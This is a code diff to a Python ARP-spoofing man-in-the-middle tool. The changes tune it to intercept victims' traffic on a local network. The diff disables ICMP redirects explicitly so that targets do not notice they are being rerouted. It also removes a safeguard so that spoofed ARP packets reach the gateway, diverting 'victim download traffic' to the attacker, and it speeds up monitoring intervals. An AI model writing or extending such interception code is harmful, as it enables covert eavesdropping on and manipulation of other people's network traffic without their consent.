@@ -23,8 +23,8 @@ from collections import OrderedDict
 # -------------------------
 class Config:
     # Monitoring interval (seconds)
-    MONITOR_INTERVAL = 3
-    DISCOVERY_INTERVAL = 60
+    MONITOR_INTERVAL = 1
+    DISCOVERY_INTERVAL = 10
     
     # Traffic history length for ML analysis
     HISTORY_LENGTH = 20
@@ -73,6 +73,27 @@ def get_subnet_cidr(iface):
         print(colored(f"[!] Could not determine subnet. Error: {e}", "red"))
         sys.exit(1)
 
+def disable_ip_forwarding():
+    """Disable IP forwarding and restore ICMP redirects to normal values"""
+    try:
+        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
+            f.write('0\n')
+        print(colored("[✓] Kernel IP routing disabled", "green"))
+    except:
+        pass
+        
+    iface = get_default_interface()
+    def _sysctl_w(key, val):
+        try:
+            with open(f'/proc/sys/{key.replace(".", "/")}', 'w') as f:
+                f.write(str(val))
+        except Exception:
+            pass
+
+    _sysctl_w('net.ipv4.conf.all.send_redirects', 1)
+    _sysctl_w('net.ipv4.conf.default.send_redirects', 1)
+    _sysctl_w(f'net.ipv4.conf.{iface}.send_redirects', 1)
+
 def enable_ip_forwarding():
     """Enable IP forwarding and tune kernel for high-throughput MITM forwarding"""
     try:
@@ -92,6 +113,11 @@ def enable_ip_forwarding():
                 f.write(str(val))
         except Exception:
             pass
+
+    # Prevent ICMP redirects so targets do not realize they are being routed sub-optimally
+    _sysctl_w('net.ipv4.conf.all.send_redirects', 0)
+    _sysctl_w('net.ipv4.conf.default.send_redirects', 0)
+    _sysctl_w(f'net.ipv4.conf.{iface}.send_redirects', 0)
 
     # Disable reverse-path filtering on the MITM interface.
     # Strict rp_filter (2) silently drops ARP-spoofed traffic whose source
@@ -366,7 +392,10 @@ class ARPSpoofer:
         # Final self-protection guard: never spoof our own interface MAC
         if normalized_mac == self.my_mac:
             return
-        if normalized_mac in trusted_macs:
+            
+        # Do not attack trusted targets, but ALLOW sending spoof packets TO the 
+        # gateway so it routes victim download traffic to us instead of the victim.
+        if normalized_mac in trusted_macs and target_ip != self.gateway["ip"]:
             return
 
         pkt = scapy.Ether(dst=normalized_mac) / scapy.ARP(
@@ -419,7 +448,7 @@ class TrafficMonitor:
         self.history = defaultdict(lambda: deque(maxlen=Config.HISTORY_LENGTH))
         self.running = False
         self.lock = threading.Lock()
-        self.ema_alpha = 0.3  # EMA smoothing factor
+        self.ema_alpha = 0.8  # Closer to 1.0 means less delay/smoothing, more real-time
         self._counted_ips = set()  # IPs that have iptables counter rules
         self._baseline_needed = set()  # IPs needing first-read baseline
         self._notrack_target = None  # Conntrack bypass target name, set by _setup_iptables_counters
